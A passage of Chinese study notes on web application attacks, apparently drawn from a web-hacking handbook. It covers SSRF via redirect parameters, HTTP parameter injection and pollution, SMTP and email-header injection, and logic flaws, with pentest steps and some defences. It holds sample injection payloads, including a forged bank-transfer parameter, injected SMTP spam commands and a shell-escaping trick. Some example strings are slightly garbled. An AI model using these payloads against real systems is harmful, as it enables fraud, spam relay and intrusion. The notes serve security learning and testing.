<li>服务器端 HTTP 重定向：攻击者通过注入参数到后端发起的请求中，指定应用程序请求任意的资源或 URL；</li>
<li>HTTP 参数注入（HPI）：攻击者通过注入参数，覆盖应用程序发出的请求的指令，改变其行为逻辑和结果；</li>
</ul>
<h3 id="服务器端-HTTP-重定向"><a href="#服务器端-HTTP-重定向" class="headerlink" title="服务器端 HTTP 重定向"></a>服务器端 HTTP 重定向</h3><p>应用程序向客户端提供的功能有时并不是由应用程序本身来完成的，而是后端有部署其他组件来提供相应的功能，因此应用程序经常需要将用户的输入，转换成相应的参数，向后端组件发起相应的请求；</p>
<p>示例：以下由客户端发出的请求中，loc 参数指定了要获取的 CSS 文件的地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view=default&amp;loc=online.wahh-blogs.net/css/wahh.css</span><br></pre></td></tr></table></figure>

<p>攻击者可以通过替换 loc 参数的值，来让应用程序向其指定的地址发起资源请求，如果应用程序没有对此进行确认和过滤，则攻击者可以将地址设置为后端服务器可以访问的任意资源；</p>
<p>示例：攻击者将地址替换为后端的 SSH 服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 请求，loc 参数值被替换</span><br><span class="line">view=default&amp;loc=192.168.0.1:22</span><br><span class="line"></span><br><span class="line"># 响应，包括了 SSH 服务的信息</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">SSH-2.0-OpenSSH_4.2Protocol mismatch.</span><br></pre></td></tr></table></figure>

<p>攻击者可以利用该漏洞，让应用程序成为一个开放的代理服务器，来实施各种其他攻击</p>
<ul>
<li>攻击者可以将该代理服务器用于攻击互联网上的第三方系统；</li>
<li>攻击者可以通过该服务器连接到组织内部网络中的任意主机，从而访问无法通过因特网直接访问的资源或服务；</li>
<li>攻击者可以利用该服务器反向连接到应用程序服务器上的其他服务，从而避开防火墙限制，并利用信任关系来避开身份验证；</li>
<li>攻击者可以让应用程序在响应中包括受控的内容，从而实施跨站点脚本等攻击；</li>
</ul>
<p>渗透测试步骤</p>
<ol>
<li>确定任何可能包含主机名、IP 地址或完整 URL 的请求参数；</li>
<li>对于每个参数，修改参数值，指向其他与所请求的资源类似的资源，观察该资源是否会出现在服务器的响应中；</li>
<li>尝试指定一个受控的 URL，然后监控在请求发出后，该 URL 是否被访问；</li>
<li>如果 URL 没有被连接，则观察请求的响应时间，如果时间很久，则有可能是因为某种访问规则的限制，导致应用程序的请求发不出去，导致超时；</li>
<li>如果能够成功发现漏洞，连接到任意的 URL，则可以尝试实施以下攻击：<ol>
<li>确认是否可以指定端口号，例如：<a target="_blank" rel="noopener" href="http://mdattacker.net:22/">http://mdattacker.net:22</a></li>
<li>如果可以指定端口号，尝试使用类似 Burp Intruder 等工具对内部网络的端口进行扫描，以逐个连接到一系列 IP 地址和端口；</li>
<li>尝试连接到应用程序服务器回环地址上的其他服务；</li>
<li>尝试将受控的 Web 页面加载到应用程序的响应中，以实现跨站点脚本攻击；</li>
</ol>
</li>
</ol>
<blockquote>
<p>有些服务器程序的重定向 API，例如 ASP.NET 中的 Server.Transfer 和 Server.Excecute，仅可重定向到同一主机上的相关URL，尽管如此，攻击者仍然可以利用信任关系，访问服务器上原本受保护的敏感资源；</p>
</blockquote>
<h3 id="HTTP-参数注入"><a href="#HTTP-参数注入" class="headerlink" title="HTTP 参数注入"></a>HTTP 参数注入</h3><p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 客户端发起的 HTTP 请求</span><br><span class="line">POST /bank/48/Default.aspx HTTP/1.0</span><br><span class="line">Host: mdsec.net</span><br><span class="line">Content-Length: 65</span><br><span class="line"></span><br><span class="line">FromAccount=123&amp;Amount=1000&amp;ToAccount=456&amp;Summit=Submit</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 应用程序基于客户端的输入，生成新的后端 HTTP 请求</span><br><span class="line">POST /doTransfer.asp HTTP/1.0</span><br><span class="line">Host: mdsec-mgr.ini.mdsec.net</span><br><span class="line">Content-Lenght: 44</span><br><span class="line">fromacc=123&amp;Amount=1000&amp;toacc=456&amp;clearedfunds=false</span><br></pre></td></tr></table></figure>

<p>由于应用程序检查后，发现账户上的余额不足，因此在发起的请求中添加了 clearedfunds&#x3D;false 键值对来避免触发实际的转账，因此，攻击有可能伪造参数来触发转账</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 客户端发起的 HTTP 修改为</span><br><span class="line"># 此处故意将请求参数中的等号 = 用 %3d 来表示，连接符 &amp; 用 %26 表示，以利用应用程序将其解码为正确的符号）: </span><br><span class="line">FromAccount=123&amp;Amount=1000&amp;ToAccount=456%26clearedfunds%3dtrue&amp;Summit=Submit</span><br></pre></td></tr></table></figure>

<p>如果应用程序没有将用户的请求进行过滤，则其向其他组件发起的请求将变成如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 应用程序未过滤用户输入时发起的请求变成如下：</span><br><span class="line">fromacc=123&amp;Amount=1000&amp;toacc=456&amp;clearedfunds=true</span><br></pre></td></tr></table></figure>

<blockquote>
<p>使用 HTTP 参数注入与 SOAP 注入的一个区别是，如果参数格式不对，SOAP 因为使用了 XML，会报错，从而为攻击者提供有用的反馈信息；但 HTTP 参数如果出现错误，一般不会报错，因此这会带来攻击上的困难，攻击者很难通过随机的方式猜测到参数是什么，但是如果应用程序使用的第三方组件的代码可以被查到，则攻击者可以通过查看这些代码的文档，找到其参数格式信息；</p>
</blockquote>
<h4 id="HTTP-参数污染"><a href="#HTTP-参数污染" class="headerlink" title="HTTP 参数污染"></a>HTTP 参数污染</h4><p>如果客户端发起的请求中，包括多个同名的键值对，HTTP 报文解析器会如何处理？不同的解析器会有不同的处理方式，常见的有以下几种：</p>
<ul>
<li>使用第一个键值对实例；</li>
<li>使用最后一个实例；</li>
<li>将同名键值对组成数组；</li>
<li>不处理，串联多个参数值，添加某种分隔符；</li>
</ul>
<p>如果应用程序使用最后一个或者第一个同名实例，都有可能让攻击者攻击成功；</p>
<h4 id="攻击-URL-重写转换"><a href="#攻击-URL-重写转换" class="headerlink" title="攻击 URL 重写转换"></a>攻击 URL 重写转换</h4><p>许多服务器程序会将受到的客户端请求的 URL 路径部分进行重写，例如处理 REST 风格的参数，定制路由函数等；如果在重写的过程中，没有进行过滤检查，则攻击者可以利用访漏洞，进行参数污染；</p>
<p>示例：开发者在 Apache 中配置 mod_rewrite 规则用于处理可公共访问的用户资源</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RewriteCond %&#123;THE_REQUEST&#125; ^[A-Z]&#123;3, 9&#125;\ /pub/user/[^\&amp;]*\TP/</span><br><span class="line">RewriteRule ^pub/user/([^/\.] +)$ /inc/user_mgr.php?mode=view&amp;name=$1</span><br></pre></td></tr></table></figure>

<p>该规则提取用户请求中的文件名，做为值，与 name 字段组成参数，传递给 user_mgr.php 页面进行处理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 例如接受如下请求</span><br><span class="line">/pub/user/marcus</span><br><span class="line"></span><br><span class="line"># 之后转换为</span><br><span class="line">/inc/user_mgr.php?mode=view&amp;name=marcus</span><br></pre></td></tr></table></figure>

<p>攻击者可在原始请求中注入另外 mode 来改变应用程序的行为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 攻击者注入额外的参数值</span><br><span class="line">/pub/user/marcus%26mode%30edit</span><br><span class="line"></span><br><span class="line"># Apache 服务器转换后</span><br><span class="line">/inc/user_mgr.php?mode=view&amp;name=marcus&amp;mode=edit</span><br></pre></td></tr></table></figure>

<p>渗透测试步骤</p>
<ol>
<li>轮流对每个请求参数进行测试，使用各种语法添加一个新注入的参数<ol>
<li>%26foo%3dbar，URL 编码的 &amp;foo&#x3D;bar</li>
<li>%3bfoo%3dbar，URL 编码的 ;foo&#x3D;bar</li>
<li>%2526foo%253dbar，双重 URL 编码的 &amp;foo&#x3D;bar（将 % 百分比也做了一重编码）</li>
</ol>
</li>
<li>确定任何修改后，不会改变应用程序行为的参数实例；</li>
<li>尝试在请求的不同位置注入一个已知的参数，看这样做是否会覆盖或修改现有的参数；</li>
<li>如果这样做会将旧值替换成新值，尝试是否可以通过注入一个由后端服务器读取的值，来避开任何前面确认机制；</li>
<li>用其他参数名称替换注入的已知参数（可通过解析应用程序的功能进行猜测和寻找线索）；</li>
<li>测试应用程序是否允许在请求中多次提交同一个参数，在参数的前后，以及请求的不同位置提交多余的值，例如查询字符串、cookie 和消息主体中；</li>
</ol>
<h2 id="注入电子邮件"><a href="#注入电子邮件" class="headerlink" title="注入电子邮件"></a>注入电子邮件</h2><p>有些应用程序提供收集用户反馈的功能，例如关于产品的建议或者BUG，有些时候这类功能在后端使用电子邮件的形式来实现。即用户提交的输入，到了后端会发送给 SMTP 服务器，然后按照某种设定好的模板，发送给相关的人员；如果应用程序没有对用户的输入进行仔细净化的话，攻击者就有机会在提交的内容中，注入一些 SMTP 命令，从而控制 SMTP 服务器，实现一些非法行为，例如让 SMTP 服务器帮助攻击者发送垃圾邮件等；</p>
<h3 id="操纵电子邮件头部"><a href="#操纵电子邮件头部" class="headerlink" title="操纵电子邮件头部"></a>操纵电子邮件头部</h3><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210112082331.png"></p>
<p>应用程序允许用户提交反馈的界面，用户可以在该界面中输入自己的邮件地址；之后，Web应用程序如 PHP 将调用 mail 函数，生成电子邮件，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">To: admin@wahh-app.com</span><br><span class="line">From: marcus@wahh-mail.com</span><br><span class="line">Subject: Site problem</span><br><span class="line"></span><br><span class="line">xxxxxxxxx</span><br></pre></td></tr></table></figure>

<p>如果应用程序的后端没有对用户输入的地址进行过滤，则攻击者可以在地址中注入有效的 SMTP 命令字符串，让 SMTP 将服务发送给其指定的任意收件人</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210112082743.png"></p>
<p>PHP mail 命令将生成如下内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">To: admin@wahh-app.com</span><br><span class="line">From: marcus@wahh-mail.com</span><br><span class="line">Bcc: all@wahh-othercompany.com</span><br><span class="line">Subject: Site problem</span><br><span class="line"></span><br><span class="line">xxxxxxxxx</span><br></pre></td></tr></table></figure>

<h3 id="SMTP-命令注入"><a href="#SMTP-命令注入" class="headerlink" title="SMTP 命令注入"></a>SMTP 命令注入</h3><p>某些情况下，Web 应用程序会与 SMTP 服务器建立会话，传输数据内容；</p>
<p>用户端发起的请求，提交关于站点的反馈</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST feedback.php HTTP/1.1</span><br><span class="line">Host: wahh-app.com</span><br><span class="line">Content-Length: 56</span><br><span class="line"></span><br><span class="line">From=daf@wahh-mail.com&amp;Subject=Site+feedback&amp;Message=foo</span><br></pre></td></tr></table></figure>

<p>Web 应用程序与 SMTP 服务器建立的会话往来示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MAIL FROM: daf@wahh-mail.com</span><br><span class="line">RCPT TO: feedback@wahh-app.com</span><br><span class="line">DATA  # 此处 SMTP 客户端发出 DATA 命令，应用程序接下来将开始发送消息的内容，包括消息头和消息体，并以点号表示结束</span><br><span class="line">From: daf@wahh-mail.com</span><br><span class="line">To: feedback@wahh-app.com</span><br><span class="line">Subject: Site feedback</span><br><span class="line">foo</span><br><span class="line">. # 用单独一行的点等号表示消息的结束</span><br></pre></td></tr></table></figure>

<p>如果应用程序没有对用户输入进行过滤的话，则攻击者可以利用这个漏洞，在消息中注入有效的 SMTP 命令，从而实现对  SMTP 服务器的控制；注入示例如下（在 subject 字段进行注入）：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210112084106.png"></p>
<p>之后 Web 应用程序建立如下 SMTP 会话，生成了两个电子邮件，其中第二段由攻击者完全控制：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">MAIL FROM: daf@wahh-mail.com</span><br><span class="line">RCPT TO: feedback@wahh-app.com</span><br><span class="line">DATA </span><br><span class="line">From: daf@wahh-mail.com</span><br><span class="line">To: feedback@wahh-app.com</span><br><span class="line">Subject: Site feedback</span><br><span class="line">foo</span><br><span class="line">.</span><br><span class="line">MAIL FROM: mail@wahh-viagra.com</span><br><span class="line">RCPT TO: john@wahh-mail.com</span><br><span class="line">DATA</span><br><span class="line">From: mail@wahh-viagra.com</span><br><span class="line">To: john@wahh-mail.com</span><br><span class="line">Subject: Cheap V1AGR4</span><br><span class="line">Blah</span><br><span class="line">.</span><br><span class="line">foo</span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<h3 id="查找-SMTP-漏洞"><a href="#查找-SMTP-漏洞" class="headerlink" title="查找 SMTP 漏洞"></a>查找 SMTP 漏洞</h3><p>在解析应用程序的功能时，留意其中那些与电子邮件相关的功能，测试这些功能涉及的每一个参数，甚至那些可能与生成的消息无关的参数；</p>
<p>除了每一种攻击方式外，还注意各使用 Windows 和 Unix 的换行符来测试一遍，因为有时候并不知道后台使用的是哪一种操作系统；</p>
<p>渗透测试步骤</p>
<ul>
<li>轮流提交以下的测试字符串作为每一个参数，用于在相关位置插入电子邮件地址；<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210112085804.png"></li>
<li>留意应用程序返回的错误消息，根据错误消息，看是否跟电子邮件功能相关，如果是的话，考虑对提交的注入内容进行相应的调整，以利用漏洞；</li>
<li>监控受控的邮箱，看是否收到邮件；</li>
<li>仔细检查发出的 HTTP 请求，看是否存在与后端的电子邮件相关的线索，例如是否包含隐藏或禁用字段，用于指定电子邮件收件人等；</li>
</ul>
<blockquote>
<p>发送电子邮件功能经常被视为外围功能，而非核心功能，因此经常没有被重视，并采取足够的安全保障；电子邮件有时需要调用一些不常用的第三方组件，应用程序经常直接调用操作系统的命令来执行它们，因此还经常隐藏着 OS 命令的注入漏洞，应对其进行仔细的检查；</p>
</blockquote>
<h3 id="防止-SMTP-注入"><a href="#防止-SMTP-注入" class="headerlink" title="防止 SMTP 注入"></a>防止 SMTP 注入</h3><p>防止 SMTP 注入的办法用户提交的任何数据进行严格的检查</p>
<ul>
<li>根据一个适当的正则表达式检查电子邮件地址，例如拒绝所有的换行符；</li>
<li>消息主题不得包含任何的换行符，并应实施适当的长度限制；</li>
<li>如果消息内容会被 SMTP 会话直接使用，则应在消息内容中禁止使用只有一个点字符的消息行；</li>
</ul>
<h2 id="小结-6"><a href="#小结-6" class="headerlink" title="小结"></a>小结</h2><p>一般来说，实施有效攻击的关键在于从直觉上了解漏洞的位置，以及如何对其加以利用；获得这种直觉的方式在于实践，在现实的应用程序中，演练前面提到的各种攻击技巧，并观察应用程序如何对攻击作出反应，从而建立对应用程序行为与漏洞有关联的直觉。</p>
<h1 id="11-攻击应用程序逻辑"><a href="#11-攻击应用程序逻辑" class="headerlink" title="11. 攻击应用程序逻辑"></a>11. 攻击应用程序逻辑</h1><p>计算机不外乎做两种计算，一种是逻辑计算，一种是算术计算；所有复杂的应用程序功能，最后都将拆解成由简单的逻辑和算术计算来构成；人们常常只关注那些常见的漏洞，例如 SQL 注入或者跨站点脚本，却往往忽略了程序中的逻辑漏洞其实它们无处不在，尤其是当应用程序是由多名水平参差不齐的开发者来共同完成的时候；这些漏洞经常是与应用程序功能紧密相关和唯一的，它们很隐蔽，无法被常规的漏洞扫描器所发现；</p>
<h2 id="逻辑缺陷的本质"><a href="#逻辑缺陷的本质" class="headerlink" title="逻辑缺陷的本质"></a>逻辑缺陷的本质</h2><p>逻辑缺陷本质上来源于开发者的设计缺陷，由于开发者在设计过程，做出某种错误的假设，导致应用程序在某些条件下，将出现预期外的行为；只要开发者的水平没有显著提高，这些漏洞缺陷将是不可避免和大量存在的。</p>
<h2 id="现实中的逻辑缺陷"><a href="#现实中的逻辑缺陷" class="headerlink" title="现实中的逻辑缺陷"></a>现实中的逻辑缺陷</h2><h3 id="例子1：加密算法提示漏洞"><a href="#例子1：加密算法提示漏洞" class="headerlink" title="例子1：加密算法提示漏洞"></a>例子1：加密算法提示漏洞</h3><p>有些应用程序为了减少用户登录的次数，会将用户信息加密成一个长久有效的 cookie 值，存储在浏览器中；正常情况下，攻击者是无法破解该加密后的 cookie 值的，但是有些开发者还会将该加密算法应用于其他 cookie 字段，例如屏幕上显示的用户昵称；但好死不死的是，用户昵称是可以由用户自己指定的；因此，攻击者通过指定不同的用户昵称，就可以得到加密后的值；此时，攻击者可以将自己浏览器上加密后的 cookie 值做为昵称，经过加密算法解密后，得出原始值的格式；然后再按照相同的格式，尝试将其中的用户名替换为管理员的用户名，然后设置为昵称，这样就可以得到加密后的新 cookie 值；使用该 cookie 值，很可能就可以实现管理员登录；</p>
<h4 id="渗透测试步骤-48"><a href="#渗透测试步骤-48" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><p>漏洞场景：使用令牌的程序</p>
<ul>
<li>在应用程序中找出使用加密值的位置（大多数情况下是使用散列值）；<ul>
<li>查找应用程序中，任何对用户提交的值进行加密或者解密的位置；</li>
<li>如发现应用程序使用某个加密值，尝试替代该加密值，然后观察程序是否会提示替代后的结果或报错；</li>
<li>如有结果或报销，尝试利用该信息；</li>
</ul>
</li>
<li>查找应用程序中，当用户提交加密值，程序会在响应中显示对应的解密值的位置<ul>
<li>如有，说明提示漏洞存在；</li>
<li>确认这种漏洞是否会导致敏感令牌泄露；</li>
</ul>
</li>
<li>查找应用程序中，当用户提交明文值，程序会在响应中显示对应的加密值的位置；<ul>
<li>如有，说明提示漏洞可能存在；</li>
<li>尝试对该漏洞加以利用，例如通过指定任意值，让程序进行处理，得到有用的信息；</li>
</ul>
</li>
</ul>
<h3 id="例子2：密码修改漏洞"><a href="#例子2：密码修改漏洞" class="headerlink" title="例子2：密码修改漏洞"></a>例子2：密码修改漏洞</h3><p>有些程序为用户提供修改密码的功能，该功能要求客户端提交用户名、现有密码、新密码等字段组成；同时，该功能同时也面向管理员，即管理员也可以使用该功能修改自己的密码；两种角色的区别在于管理员不需要提供现有密码，后端的代码通过判断是否包含现有密码，来区别修改密码的用户是否为管理员角色；</p>
<blockquote>
<p>这个漏洞的脑洞太大了，简直是致命的；攻击者可以利用该漏洞获得管理员的权限，并修改任意用户的现有密码；</p>
</blockquote>
<h4 id="渗透测试步骤-49"><a href="#渗透测试步骤-49" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>在探查逻辑缺陷时，尝试轮流删除关键功能的请求中提交的每一个参数，例如 cookie、查询字符串、POST 参数等；<ul>
<li>删除参数名称的时候，同时也删除参数值，而不是将参数值设置为空字符串；</li>
<li>一次仅攻击一个参数，确保可以覆盖后端代码逻辑中的每一个分支；</li>
<li>如果该功能属于多阶段过程，务必要完成整个过程，因为很可能后面步骤会使用前面步骤中提交的并保存在会话中的数据；</li>
</ul>
</li>
</ul>
<h3 id="例子3：步骤控制漏洞"><a href="#例子3：步骤控制漏洞" class="headerlink" title="例子3：步骤控制漏洞"></a>例子3：步骤控制漏洞</h3><p>在多步骤的功能中，很多开发者想当然的认为用户一定会按照界面上显示的内容，依次完成每一个环节，但事实上攻击者并不会这么做；攻击者会以任意顺序提交请求，从而绕过一些中间步骤，达到最终结果；</p>
<h4 id="渗透测试步骤-50"><a href="#渗透测试步骤-50" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>如果某个多阶段功能需要按预定顺序提交一系列请求，尝试按其他顺序提交请求；<ul>
<li>尝试完全忽略某些中间阶段；</li>
<li>多次访问同一个阶段；</li>
<li>推后访问前一个阶段；</li>
</ul>
</li>
<li>了解多阶段功能的阶段控制办法；<ul>
<li>例如多阶段功能的不同阶段的请求，可能都是访问的同一个 URL，并在参数中指定阶段序号参数或者阶段名称；</li>
</ul>
</li>
<li>猜测开发者做出的错误假设，判断主要受攻击面的点；<ul>
<li>设法找出如何违反这些假设的方法，从而让程序出现反常行为；</li>
</ul>
</li>
<li>在不按顺序访问程序时，如果程序出现异常行为，例如某个变量值和状态值异常；则此时很可能存在可以利用的有用错误信息，可用来进一步推断程序的内部机制，以便对攻击方法进行优化；</li>
</ul>
<h3 id="例子4：额外字段漏洞"><a href="#例子4：额外字段漏洞" class="headerlink" title="例子4：额外字段漏洞"></a>例子4：额外字段漏洞</h3><p>开发者经常假设用户只会提交页面表单所指定的字段，但事实上攻击者可以提交额外的字段，来影响程序的行为；</p>
<blockquote>
<p>因此，绝对不能读取客户端提交的整个请求对象，而是按需读取；如果需要读取很多字段，可以编写一个函数进行净化处理，返回一个按需读取后生成的新对象；</p>
</blockquote>
<p>在多阶段的功能中，开发者经常在后面阶段中假设其收到的值，已经在前面的阶段中经过了严格的检查，但事实上，由于攻击可以直接访问任意一个阶段，这将导致后面阶段收到的值，其实是攻击者自行定义好的，根本没有经过前面阶段的代码的任何检查；</p>
<h4 id="渗透测试步骤-51"><a href="#渗透测试步骤-51" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>如果存在多阶段的功能，则应提取某个阶段提交的参数，然后尝试在另外一阶段提交该参数；<ul>
<li>如果程序的状态随参数的变化出现更新，则应进一步探索这种漏洞的衍生效果，看是否可以利用它来实施恶意的操作；</li>
</ul>
</li>
<li>某个功能可能使用不同的参数来区分用户，来产生不同的行为；观察不同角色的用户，就同一项功能，是否在提交的参数上有什么不同；<ul>
<li>如果有，就尝试以 B 用户的身份提交 A 用户的独有参数，观察该请求的衍生效果，猜测是否存在可利用的漏洞；</li>
</ul>
</li>
</ul>
<h3 id="例子5：会话身份漏洞"><a href="#例子5：会话身份漏洞" class="headerlink" title="例子5：会话身份漏洞"></a>例子5：会话身份漏洞</h3><p>开发者经常将用户信息保存在会话中，如果程序中存在某个功能（例如注册），允许更改会话中用户的的核心信息，则有可能存在伪造身份的漏洞，即攻击者先注册一个有效的会话，然后利用该功能，更改其会话中的身份信息，并跳转到程序中的其他页面，此时很可能能够扮演其他身份的用户；</p>
<h4 id="渗透测试步骤-52"><a href="#渗透测试步骤-52" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>如果应用程序存在水平权限或垂直权限隔离，则设法确定会话中存储了哪些与用户身份相关的信息；</li>
<li>浏览某个功能区域，然后转换到另一个完全无关的区域，检查积聚的状态，是否会对应用程序的行为造成影响；</li>
</ul>
<h3 id="例子6：交易限额漏洞"><a href="#例子6：交易限额漏洞" class="headerlink" title="例子6：交易限额漏洞"></a>例子6：交易限额漏洞</h3><p>假设某个程序有权在两个受控的账户之间进行转账（例如银行账户），并设置转账限额，超过限额后需要审批；限额判断的代码容易犯一个错误，即忘记处理输入值为负数的情况，此时有可能导致反向转账成功；</p>
<h4 id="渗透测试步骤-53"><a href="#渗透测试步骤-53" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><p>规避交易限制的第一步，是先确认当前的输入控制接受哪些字符，不接受哪些字符</p>
<ul>
<li>试着输入负值，观察程序是否能够正常处理；</li>
<li>如果能够正常处理，此时有可能需要为利用漏洞创造条件，例如确保转出账户上有足够的金额；（想起了虚拟平台被攻击的案例）；</li>
</ul>
<h3 id="例子7：折扣计算漏洞"><a href="#例子7：折扣计算漏洞" class="headerlink" title="例子7：折扣计算漏洞"></a>例子7：折扣计算漏洞</h3><p>很多电商程序会提供折扣计算功能，即购物金额超过一定金额时，消费者能够享受到更大的折扣；开发者有时会忘记处理逆向场景，即当消费者将商品从购物车移走时，需要重新计算折扣，导致消费者可以利用这个漏洞，先添加在大量商品，触发折扣条件，然后再移除不需要的商品；</p>
<h4 id="渗透测试步骤-54"><a href="#渗透测试步骤-54" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>检查应用程序中，是否存在价格或其他敏感价值的东西，需要根据用户输入的数据进行调整的情况；</li>
<li>如果有，了解程序使用的算法和调整的逻辑；</li>
<li>检查这些调整是一次性的行为，还是非一次性行为；</li>
<li>发挥想象力，想出一种操纵办法，让调整行为与开发者的预设相矛盾；</li>
</ul>
<h3 id="例子8：转义符漏洞"><a href="#例子8：转义符漏洞" class="headerlink" title="例子8：转义符漏洞"></a>例子8：转义符漏洞</h3><p>为了避免注入漏洞，开发者会对敏感字符进行限制，但是开发者经常只控制一层（没有递归），导致攻击者可能会使用两层甚至多层转义的办法，来绕过开发者的限制；</p>
<p>例如：开发者会设置敏感字符列表，然后对列表中的字符添加转义符；当用户提交 foo;ls 时，开发者会对其中的敏感字符分号添加转义符，最终变成 foo;ls</p>
<p>但是，攻击者会尝试提交 foo;ls，这样一来，按照开发者的处理逻辑，最终字符串变成了 “foo\;ls”，转义符本身被转义，shelll 可以接受以上命令并执行，攻击者的注入意图得以实现；</p>
<h4 id="渗透测试步骤-55"><a href="#渗透测试步骤-55" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><p>在探查程序是否存在注入缺陷时，尝试在受控制的数据中，插入相关元字符后，再在每个元字符前插入一个反斜线，对元字符符进行转义，观察程序程序的反应；</p>
<blockquote>
<p>一些处理跨站点脚本攻击的代码中，也经常使用转义符来净化用户提交的数据，但是它们经常忘了对转义符本身进行处理；</p>
</blockquote>
<h3 id="例子9：过滤截短漏洞"><a href="#例子9：过滤截短漏洞" class="headerlink" title="例子9：过滤截短漏洞"></a>例子9：过滤截短漏洞</h3><p>开发者在防范 SQL 注入漏洞时，会使用过滤和长度限制两种方法；一种常见的过滤方法是对引号进行配对，这样就可以避免攻击者使用引号；在做长度限制时，有些开发者不是直接报错，而是对输入进行截短；攻击者此时可以巧妙的利用截短功能，来使用引号配对功能失效，从而能够实施注入攻击；</p>
<blockquote>
<p>一开始并不需要知道开发者实施的长度限制是多少，攻击者只需要轮流提交奇数个和偶数个由引号组成的长字符串，并观察程序是否报错，即可确认长度限制为多少；</p>
</blockquote>
<h4 id="渗透测试步骤-56"><a href="#渗透测试步骤-56" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><p>记下应用程序中修改用户输入的所有位置（例如截短、删除数据、编码、解码等）；对于观察到每一个位置，检查是否可以人为构造恶意字符串；</p>
<ul>
<li>如果输入数据已经被过滤了一次（非递归），确认是否可以提交一个“补偿”过滤的字符串；例如：假设程序会过滤着关键字 SELECT，则尝试提交 SELECTSELECT，看程序是否会在过滤后，留下一个 SELECT；</li>
<li>如果程序中存在多步骤的行为，则可以检查是否可以利用后面的步骤，来破坏上一个步骤的过滤结果；</li>
</ul>
<h3 id="例子10：搜索功能漏洞"><a href="#例子10：搜索功能漏洞" class="headerlink" title="例子10：搜索功能漏洞"></a>例子10：搜索功能漏洞</h3><p>有些应用程序提供全局搜索功能，即搜索所有文档，但有时这些文档只是部分公开，攻击者可以利用搜索功能，反复提交各种关键字组合，从而推断出文档的内容，获取一些敏感数据；</p>
<h3 id="例子11：调试信息漏洞"><a href="#例子11：调试信息漏洞" class="headerlink" title="例子11：调试信息漏洞"></a>例子11：调试信息漏洞</h3><p>当一个新产品上线时，前期不可避免会存在大量功能上的缺陷，开发者为了方便调试，经常会让程序返回一些与错误相关的数据，有时候这些数据是很敏感的，例如用户的令牌、用户名、请求参数等；开发者有时会将这些数据保存在某个全局变量，然后使用某个 URL 指向它，然后通过重定向返回错误提示数据；</p>
